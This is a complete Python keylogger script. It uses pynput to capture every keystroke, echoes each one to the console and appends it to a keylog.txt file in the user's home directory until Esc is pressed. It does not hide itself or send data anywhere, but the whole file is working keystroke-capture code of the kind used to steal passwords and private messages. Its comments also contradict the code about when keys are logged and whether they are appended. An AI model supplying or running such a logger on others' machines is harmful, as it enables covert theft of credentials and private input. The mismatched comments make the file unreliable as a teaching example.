from pynput import keyboard
# To transform a Dictionary to a JSON string we need the json package.
import json
#  The Timer module is part of the threading package.
import threading
from pathlib import Path

# We make a global variable text where we'll save a string of the keystrokes which we'll write to a log file
text: str = ""
keylog_filename = Path.home() / "keylog.txt"

keylog_file = keylog_filename.open("a")

def on_release(key):
    global keylog_file
    if key == keyboard.Key.esc:
        print("exiting")
        keylog_file.close()
        listener.stop()
# end on_release


# We only need to log the key once it is released. That way it takes the modifier keys into consideration.
def on_press(key):
    global text


    if key == keyboard.Key.enter:
        text += "\n"
    elif key == keyboard.Key.tab:
        text += "\t"
    elif key == keyboard.Key.space:
        text += " "
    elif key == keyboard.Key.shift:
        pass
    elif key == keyboard.Key.backspace and len(text) == 0:
        pass
    elif key == keyboard.Key.backspace and len(text) > 0:
        text = text[:-1]
    elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
        pass
    elif key == keyboard.Key.esc:
        pass
    else:
        # We do an explicit conversion from the key object to a string and then append that to the string held in memory.
        text = str(key).strip("'")
    print(text)
    keylog_file.write(text)
# end on_press

# A keyboard listener is a threading.Thread, and a callback on_press will be invoked from this thread.
# In the on_press function we specified how to deal with the different inputs received by the listener.
listener = keyboard.Listener(on_press=on_press, on_release=on_release)
listener.start()
listener.join()
print("keylog end")